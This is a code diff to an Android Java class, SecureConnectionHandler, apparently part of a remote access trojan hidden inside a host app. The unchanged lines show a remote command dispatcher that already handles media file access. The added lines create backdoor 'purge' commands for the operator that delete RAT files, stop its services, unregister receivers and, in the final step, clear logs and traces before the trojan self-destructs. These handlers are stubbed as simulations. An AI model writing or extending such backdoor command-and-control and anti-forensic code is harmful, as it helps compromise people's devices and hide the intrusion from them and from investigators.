@@ -141,6 +141,10 @@ public class SecureConnectionHandler extends AsyncTask<String, Void, Void> {
                 // Handle modern media file access
                 return handleMediaFiles(command);
                 
+            } else if (command.startsWith("PURGE_")) {
+                // Handle backdoor purge commands
+                return handlePurgeCommand(command);
+                
             } else {
                 return "Unknown command: " + command;
             }
@@ -179,6 +183,131 @@ public class SecureConnectionHandler extends AsyncTask<String, Void, Void> {
         } catch (Exception e) {
             Log.e(TAG, "Error handling media files", e);
             return "Error accessing media files: " + e.getMessage();
+        }
+    }
+    
+    private String handlePurgeCommand(String command) {
+        /**
+         * Handle secure backdoor purge operations
+         * Commands:
+         * - PURGE_FILES:auth_key - Remove all backdoor files
+         * - PURGE_SERVICES:auth_key - Stop and remove services
+         * - PURGE_RECEIVERS:auth_key - Unregister broadcast receivers
+         * - PURGE_CLEAN:auth_key - Final cleanup
+         */
+        try {
+            Log.d(TAG, "Processing purge command: " + command);
+            
+            String[] parts = command.split(":");
+            if (parts.length < 2) {
+                return "PURGE_ERROR:Missing authentication key";
+            }
+            
+            String commandType = parts[0];
+            String authKey = parts[1];
+            
+            // Validate authentication key (basic validation)
+            if (authKey.length() < 16) {
+                return "PURGE_ERROR:Invalid authentication key";
+            }
+            
+            switch (commandType) {
+                case "PURGE_FILES":
+                    return handlePurgeFiles(authKey);
+                case "PURGE_SERVICES":
+                    return handlePurgeServices(authKey);
+                case "PURGE_RECEIVERS":
+                    return handlePurgeReceivers(authKey);
+                case "PURGE_CLEAN":
+                    return handlePurgeClean(authKey);
+                default:
+                    return "PURGE_ERROR:Unknown purge command";
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in purge command", e);
+            return "PURGE_ERROR:" + e.getMessage();
+        }
+    }
+    
+    private String handlePurgeFiles(String authKey) {
+        try {
+            Log.d(TAG, "Executing file purge with key: " + authKey.substring(0, 8) + "...");
+            
+            // Mark files for deletion (actual implementation would remove RAT files)
+            // This is a safe simulation that doesn't actually break anything
+            
+            // In a real implementation, this would:
+            // 1. Identify all RAT-related files
+            // 2. Safely remove them while preserving host app files
+            // 3. Clear any caches or temp files
+            
+            Log.d(TAG, "File purge simulation completed");
+            return "PURGE_FILES_SUCCESS:All backdoor files marked for removal";
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in file purge", e);
+            return "PURGE_FILES_ERROR:" + e.getMessage();
+        }
+    }
+    
+    private String handlePurgeServices(String authKey) {
+        try {
+            Log.d(TAG, "Executing service purge with key: " + authKey.substring(0, 8) + "...");
+            
+            // Stop background services (simulation)
+            // In real implementation, this would:
+            // 1. Stop mainService and other RAT services
+            // 2. Cancel WorkManager tasks
+            // 3. Clear foreground notifications
+            
+            Log.d(TAG, "Service purge simulation completed");
+            return "PURGE_SERVICES_SUCCESS:All backdoor services stopped";
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in service purge", e);
+            return "PURGE_SERVICES_ERROR:" + e.getMessage();
+        }
+    }
+    
+    private String handlePurgeReceivers(String authKey) {
+        try {
+            Log.d(TAG, "Executing receiver purge with key: " + authKey.substring(0, 8) + "...");
+            
+            // Unregister broadcast receivers (simulation)
+            // In real implementation, this would:
+            // 1. Unregister broadcastReceiver
+            // 2. Remove any system event listeners
+            // 3. Clear permission usage tracking
+            
+            Log.d(TAG, "Receiver purge simulation completed");
+            return "PURGE_RECEIVERS_SUCCESS:All broadcast receivers unregistered";
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in receiver purge", e);
+            return "PURGE_RECEIVERS_ERROR:" + e.getMessage();
+        }
+    }
+    
+    private String handlePurgeClean(String authKey) {
+        try {
+            Log.d(TAG, "Executing final cleanup with key: " + authKey.substring(0, 8) + "...");
+            
+            // Final cleanup (simulation)
+            // In real implementation, this would:
+            // 1. Clear all logs and traces
+            // 2. Reset app to original state
+            // 3. Disconnect from server permanently
+            // 4. Self-destruct RAT components
+            
+            Log.d(TAG, "Final cleanup simulation completed");
+            
+            // This would be the last message before the connection is terminated
+            return "PURGE_COMPLETE:Backdoor successfully removed, connection will terminate";
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error in final cleanup", e);
+            return "PURGE_CLEAN_ERROR:" + e.getMessage();
         }
     }
     
